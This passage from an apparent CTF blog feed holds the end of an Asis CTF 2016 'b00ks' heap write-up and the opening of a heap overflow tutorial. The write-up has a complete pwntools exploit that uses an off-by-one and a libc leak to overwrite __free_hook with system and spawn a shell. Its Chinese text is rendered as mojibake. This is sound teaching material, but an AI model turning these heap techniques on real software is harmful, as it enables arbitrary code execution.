<code>Delete()</code> è°ƒç”¨ <code>free</code> æ‰§è¡Œ <code>system(/bin/sh)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks38.png" alt="ã€Asis CTF 2016ã€‘b00ks38.png"></p><hr><h1 id="è„šæœ¬äºŒ"><a href="#è„šæœ¬äºŒ" class="headerlink" title="è„šæœ¬äºŒ"></a>è„šæœ¬äºŒ</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># ä¸º unsorted bin åšå‡†å¤‡</span>Create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'ffff'</span><span class="token punctuation">)</span>   <span class="token comment"># å­˜æ”¾ '/bin/sh'</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">0x160</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># ä¼ªé€  book[0]</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># è¦†ç›– book[0] çš„æœ€ä½ä½ï¼Œæ”¹å˜å…¶æŒ‡å‘çš„åœ°å€ä¸ºä¼ªé€ çš„ book[0]</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment"># å½¢æˆ unsorted bin</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># æ³„éœ² unsorted bin çš„ bk æŒ‡é’ˆ</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>main_arena_88 <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_arena_addr <span class="token operator">=</span> main_arena_88 <span class="token operator">-</span> <span class="token number">88</span>malloc_hook_addr <span class="token operator">=</span> main_arena_addr <span class="token operator">-</span> <span class="token number">0x10</span>   <span class="token comment"># æ ¹æ®åç§»å¾—åˆ° __malloc_hook çœŸå®åœ°å€</span>libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>   <span class="token comment"># å¾—åˆ° libc åŸºåœ°å€</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_88 -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_88<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># å°† book3 -> description ä¿®æ”¹ä¸º __free_hook</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># å°† __free_hook ä¿®æ”¹ä¸º system()</span><span class="token comment"># Edit(3, p64(one_gadget_addr))   # system(/bin/sh) ä¸ one_gadget é€‰å…¶ä¸€å³å¯</span>Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœäºŒ"><a href="#ç»“æœäºŒ" class="headerlink" title="ç»“æœäºŒ"></a>ç»“æœäºŒ</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks39.png" alt="ã€Asis CTF 2016ã€‘b00ks39.png"></p>]]></content>
    
    
    <summary type="html">å¾ˆç»å…¸çš„ä¸€é“å †é¢˜ï¼Œåˆ©ç”¨ off-by-one æ¼æ´ä¿®æ”¹æŒ‡å‘å †çš„æŒ‡é’ˆï¼Œç„¶åä¼ªé€ å †å—ï¼Œåç»­å…³é”®åœ¨äºè·å¾— libc åŸºåœ°å€ï¼Œå¯ä»¥åˆ†åˆ«é€šè¿‡ mmap çš„ç‰¹ç‚¹å’Œ unsorted bin çš„ç‰¹ç‚¹æ¥è®¡ç®— libc åç§»ï¼Œæœ€ååŠ«æŒ __free_hook è·å– shell</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨</title>
    <link href="https://www.uf4te.cn/posts/baa7ab63.html"/>
    <id>https://www.uf4te.cn/posts/baa7ab63.html</id>
    <published>2024-05-27T08:13:25.000Z</published>
    <updated>2024-06-06T10:08:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h1><blockquote><p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•° <mark>ï¼ˆæ³¨æ„ï¼šæ˜¯å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼Œè€Œä¸æ˜¯ç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› ä¸ºå †ç®¡ç†å™¨ä¼šå¯¹ç”¨æˆ·æ‰€ç”³è¯·çš„å­—èŠ‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¹Ÿå¯¼è‡´å¯åˆ©ç”¨çš„å­—èŠ‚æ•°éƒ½ä¸å°äºç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼‰</mark>ï¼Œå¹¶è¦†ç›–åˆ°<strong>ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€</strong>çš„ä¸‹ä¸€ä¸ªå †å—ï¼Œè½»åˆ™å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿å¾—æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå †æº¢å‡ºæ¼æ´éœ€è¦ä¸¤ä¸ªå‰æï¼š</p><ol><li><strong>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®</strong></li><li><strong>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶</strong></li></ol><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/">å †æº¢å‡º - CTF Wiki</a></li></ol></blockquote><p><em>ä¸æ ˆæº¢å‡ºä¸åŒçš„æ˜¯ï¼Œå †ä¸Šå¹¶ä¸å­˜åœ¨è¿”å›åœ°å€ç­‰å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤å †æº¢å‡ºé€šå¸¸æ— æ³•åƒæ ˆæº¢å‡ºä¸€æ ·ç›´æ¥æ§åˆ¶ EIP</em></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºçš„ç­–ç•¥æ˜¯ï¼š</p><ol><li><p>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª <code>chunk</code></strong>Â çš„å†…å®¹</p><ul><li><code>prev_size</code></li><li><code>size</code>ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ¯”ç‰¹ä½ï¼Œä»¥åŠè¯¥å †å—çœŸæ­£çš„å¤§å°<ul><li><code>NON_MAIN_ARENA</code></li><li><code>IS_MAPPED</code></li><li><code>PREV_INUSE</code></li><li><code>the True chunk size</code></li></ul></li><li><code>chunk content</code>ï¼Œä»è€Œæ”¹å˜ç¨‹åºå›ºæœ‰çš„æ‰§è¡Œæµ</li></ul></li><li><p>åˆ©ç”¨å †ä¸­çš„æœºåˆ¶ï¼ˆå¦‚ <code>unlink</code> ç­‰ ï¼‰æ¥å®ç°ä»»æ„åœ°å€å†™å…¥æˆ–æ§åˆ¶å †å—ä¸­çš„å†…å®¹ç­‰æ•ˆæœï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p></li></ol><blockquote><p>å †æº¢å‡ºé€šå¸¸éœ€è¦é…åˆå…¶ä»–çš„æ–¹æ³•æ¥å®ç°æ¼æ´çš„åˆ©ç”¨ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šChunk Extend and Overlap ç­‰</p></blockquote><hr><h2 id="å…³é”®æ­¥éª¤"><a href="#å…³é”®æ­¥éª¤" class="headerlink" title="å…³é”®æ­¥éª¤"></a>å…³é”®æ­¥éª¤</h2><h3 id="å¯»æ‰¾å †åˆ†é…å‡½æ•°"><a href="#å¯»æ‰¾å †åˆ†é…å‡½æ•°" class="headerlink" title="å¯»æ‰¾å †åˆ†é…å‡½æ•°"></a>å¯»æ‰¾å †åˆ†é…å‡½æ•°</h3><blockquote><p>é€šå¸¸æ¥è¯´å †æ˜¯é€šè¿‡è°ƒç”¨ Glibc å‡½æ•° <code>malloc</code> è¿›è¡Œåˆ†é…çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šä½¿ç”¨ <code>calloc</code> åˆ†é…ï¼Œ<code>realloc</code> åŒæ ·ä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœ</p><p>å› æ­¤ï¼Œå¸¸ç”¨çš„å †åˆ†é…å‡½æ•°æœ‰ï¼š</p><ol><li><code>malloc</code></li><li><code>calloc</code></li><li><code>realloc</code></li></ol></blockquote><p><code>calloc</code> ä¸ <code>malloc</code> çš„åŒºåˆ«æ˜¯Â <strong>calloc åœ¨åˆ†é…åä¼šè‡ªåŠ¨è¿›è¡Œæ¸…ç©ºï¼Œè¿™å¯¹äºæŸäº›ä¿¡æ¯æ³„éœ²æ¼æ´çš„åˆ©ç”¨æ¥è¯´æ˜¯è‡´å‘½çš„</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç­‰ä»·äº</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h3><blockquote><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œå¯ä»¥å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½å­˜åœ¨å †æº¢å‡ºæ¼æ´</p></blockquote><p>å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><ul><li><p>è¾“å…¥</p><ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥Â <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li><p>è¾“å‡º</p><ul><li>sprintf</li></ul></li><li><p>å­—ç¬¦ä¸²</p><ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°Â <code>&#39;\x00&#39;</code>Â åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°Â <code>&#39;\x00&#39;</code>Â åœæ­¢</li><li>bcopy</li></ul></li></ul><hr><h3 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h3><blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»</p></blockquote><p>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦é‡ç‚¹æ³¨æ„ï¼š</p><ul><li><em><code>malloc</code> çš„å‚æ•°å¹¶ä¸ç­‰äºå®é™…åˆ†é…å †å—çš„å¤§å°</em></li></ul><p><strong><code>ptmalloc2</code> åˆ†é…å‡ºæ¥çš„å¤§å°æ˜¯å¯¹é½çš„ï¼Œè¿™ä¸ªé•¿åº¦ä¸€èˆ¬æ˜¯å­—é•¿çš„ 2 å€</strong>ã€‚æ¯”å¦‚ 32 ä½ç³»ç»Ÿæ˜¯ 8 å­—èŠ‚ï¼Œ64 ä½ç³»ç»Ÿæ˜¯ 16 å­—èŠ‚</p><p>å› æ­¤ï¼Œ<strong>å¯¹äºä¸å¤§äº 2 å€å­—é•¿çš„è¯·æ±‚ï¼Œ<code>malloc</code> ä¼šç›´æ¥è¿”å› 2 å€å­—é•¿çš„å—ï¼ˆä¹Ÿå°±æ˜¯æœ€å° <code>chunk</code>ï¼‰</strong>ï¼Œæ¯”å¦‚ 64 ä½ç³»ç»Ÿæ‰§è¡Œ <code>malloc(0)</code> ä¼šè¿”å›ç”¨æˆ·åŒºåŸŸä¸º 16 å­—èŠ‚çš„å—</p><ul><li><em>ç”¨æˆ·åŒºåŸŸçš„å¤§å°ä¸ç­‰äº <code>chunk_head.size</code></em></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">chunk_head.size = ç”¨æˆ·åŒºåŸŸå¤§å° + 2 * å­—é•¿<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¼šè¢«ä¿®æ”¹ï¼Œæœ‰å¯èƒ½ä¼šä½¿ç”¨ä¸å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª <code>chunk</code> çš„ <code>prev_size</code> å­—æ®µæ¥å‚¨å­˜å†…å®¹</li></ul><p>ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span>  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œç”³è¯·çš„ <code>chunk</code> å¤§å°æ˜¯ 24 å­—èŠ‚</p><p>ä½†æ˜¯å°†å…¶ç¼–è¯‘ä¸º 64 ä½å¯æ‰§è¡Œç¨‹åºæ—¶ï¼Œå®é™…ä¸Šåˆ†é…çš„å†…å­˜ä¼šæ˜¯ 16 å­—èŠ‚è€Œä¸æ˜¯ 24 å­—èŠ‚</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//æ ¹æ®ç³»ç»Ÿçš„ä½æ•°ï¼Œmalloc ä¼šåˆ†é… 8 æˆ– 16 å­—èŠ‚çš„ç”¨æˆ·ç©ºé—´</span><span class="token number">0x602000</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000021</span><span class="token number">0x602010</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  